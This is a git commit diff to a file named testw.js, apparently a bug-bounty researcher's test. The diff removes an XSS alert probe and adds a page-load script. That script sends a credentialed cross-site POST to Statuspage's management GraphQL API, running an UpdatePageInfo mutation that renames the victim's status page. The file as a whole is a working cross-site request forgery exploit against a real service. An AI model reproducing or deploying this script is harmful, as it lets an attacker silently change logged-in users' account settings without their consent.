9333f0494f46fb23f470d2f876b1d2da8b97de38
Malek Abu liala <64085566+malekAbuliala@users.noreply.github.com>
2025-10-01 21:39:50 +0300

    Update testw.js

--- testw.js
+++ testw.js
@@ -1,2 +1,42 @@
 
-ss"><img src=x onerror=alert('desw')>
+
+function loadDoc1() {
+  var xhttp = new XMLHttpRequest();
+
+  xhttp.open("POST", "https://manage.statuspage.io/graphql", true);
+
+  xhttp.setRequestHeader("Content-type", "application/json");
+
+  xhttp.withCredentials = true;
+  xhttp.send(JSON.stringify([{
+  operationName: "UpdatePageInfo",
+  variables: {
+    input: {
+      pageId: "YXJpOmNsb3VkOnN0YXR1c3BhZ2UtYXBpOjI2cTBnMWMzMWM0ODpwYWdlL2N0eXp4djZwbTlubg==",
+      pageName: "kalis",
+      organizationName: "test",
+      companyWebsiteUrl: null,
+      supportUrl: null,
+      privacyPolicyUrl: null,
+      smsCountryCode: "us",
+      googleAnalyticsTrackingId: null,
+      hiddenFromSearch: false,
+      rawTimeZone: "UTC"
+    }
+  },
+  query: `mutation UpdatePageInfo($input: UpdatePageInfoInput!) {
+    updatePageInfo(input: $input) {
+      success
+      errors {
+        name
+        message
+        __typename
+      }
+      __typename
+    }
+  }`
+}]));
+
+}
+
+window.onload = loadDoc1;
